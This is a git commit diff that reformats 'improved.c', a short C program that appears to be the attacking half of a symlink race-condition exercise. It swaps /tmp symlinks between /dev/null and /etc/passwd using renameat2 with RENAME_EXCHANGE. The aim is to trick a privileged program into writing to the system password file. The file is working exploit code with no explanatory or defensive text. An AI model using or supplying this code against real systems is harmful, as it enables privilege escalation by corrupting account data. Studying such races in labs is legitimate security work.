bff3d0c56e4a8e2fe6c967db81d431bf9ae206c6
anjelikasah <38975257+anjelikasah@users.noreply.github.com>
2020-09-27 18:20:10 +0545

    Update improved.c

--- improved.c
+++ improved.c
@@ -4,8 +4,10 @@
 int main()
 {
 unsigned int flags = RENAME_EXCHANGE;
-unlink("/tmp/XYZ"); symlink("/dev/null", "/tmp/XYZ");
-unlink("/tmp/ABC"); symlink("/etc/passwd", "/tmp/ABC");
+unlink("/tmp/XYZ"); 
+symlink("/dev/null", "/tmp/XYZ");
+unlink("/tmp/ABC"); 
+symlink("/etc/passwd", "/tmp/ABC");
 syscall(SYS_renameat2, 0, "/tmp/XYZ", 0, "/tmp/ABC", flags);
 return 0;
 }
